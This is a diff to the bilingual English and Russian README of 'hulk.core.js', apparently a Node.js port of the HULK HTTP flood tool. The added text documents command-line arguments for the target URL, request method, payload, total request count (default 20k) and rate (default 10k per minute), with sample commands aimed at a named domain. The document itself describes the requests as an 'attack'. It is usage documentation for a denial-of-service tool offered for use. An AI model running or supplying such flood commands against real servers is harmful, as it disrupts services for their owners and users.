@@ -17,12 +17,55 @@ Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko
   - colors
   - url
   
-- Customize
+- Setting (editing the script)
   - set_you_link - link to you server, formated "https://test.com/"
   - set_this_data - data to request (not use for GET request)
   - set_this_method - type request (GET, POST and others)
   - set_req_total - number of requests for attack
   - set_req_in_min - limit download of requests per minute
+  
+- Setting (passing arguments)
+  - Default values:
+```
+  - set_you_link - http://you_link.com/
+  - set_this_data - ''
+  - set_this_method - GET
+  - set_req_total - 20k
+  - set_req_in_min - 10k/min
+```
+  - With the argument set_this_data:
+```
+  node hulk.core.js set_you_link set_this_data set_this_method set_req_total set_req_in_min
+  node hulk.core.js http://alenmoroz.tk dsdsdsds POST 100 1000
+  
+  - set_you_link - http://alenmoroz.tk
+  - set_this_data - dsdsdsds
+  - set_this_method - POST
+  - set_req_total - 100
+  - set_req_in_min - 1000 req/min
+```
+  - Without the argument set_this_data:
+```
+  node hulk.core.js set_you_link set_this_method set_req_total set_req_in_min
+  node hulk.core.js http://alenmoroz.tk GET 1000 1000
+  
+  - set_you_link - http://alenmoroz.tk
+  - set_this_data - ''
+  - set_this_method - GET
+  - set_req_total - 1000
+  - set_req_in_min - 1000 req/min
+```
+  - Using the default settings:
+```
+  node hulk.core.js set_you_link set_this_method set_req_total
+  node hulk.core.js http://alenmoroz.tk GET 2000
+   
+  - set_you_link - http://alenmoroz.tk
+  - set_this_data - ''
+  - set_this_method - GET
+  - set_req_total - 2000
+  - set_req_in_min - 10k req/min
+```
 
 ## RU  
 
@@ -36,12 +79,55 @@ Rewritten with python (concept) under nodejs, optimized by Siarhei Dudko
   - colors
   - url
 
-- Настройка
+- Настройка (редактирование скрипта)
   - set_you_link - ссылка для атаки "https://test.com/"
   - set_this_data - данные REST запроса (могут быть пустыми)
   - set_this_method - вид запроса (GET, POST и др.)
   - set_req_total - общее число запросов к серверу
   - set_req_in_min - предел скорости запросов к серверу (запросов в минуту)
+  
+- Настройка (передача аргументов)
+  - Значения по умолчанию:
+```
+  - set_you_link - http://you_link.com/
+  - set_this_data - ''
+  - set_this_method - GET
+  - set_req_total - 20k
+  - set_req_in_min - 10k/min
+```
+  - В случае передачи аргумента set_this_data:
+```
+  node hulk.core.js set_you_link set_this_data set_this_method set_req_total set_req_in_min
+  node hulk.core.js http://alenmoroz.tk dsdsdsds POST 100 1000
+  
+  - set_you_link - http://alenmoroz.tk
+  - set_this_data - dsdsdsds
+  - set_this_method - POST
+  - set_req_total - 100
+  - set_req_in_min - 1000 req/min
+```
+  - Без передачи аргумента set_this_data:
+```
+  node hulk.core.js set_you_link set_this_method set_req_total set_req_in_min
+  node hulk.core.js http://alenmoroz.tk GET 1000 1000
+  
+  - set_you_link - http://alenmoroz.tk
+  - set_this_data - ''
+  - set_this_method - GET
+  - set_req_total - 1000
+  - set_req_in_min - 1000 req/min
+```
+  - Используя параметры по умолчанию:
+```
+  node hulk.core.js set_you_link set_this_method set_req_total
+  node hulk.core.js http://alenmoroz.tk GET 2000
+   
+  - set_you_link - http://alenmoroz.tk
+  - set_this_data - ''
+  - set_this_method - GET
+  - set_req_total - 2000
+  - set_req_in_min - 10k req/min
+```
   
 ## SCREENSHOTS
 
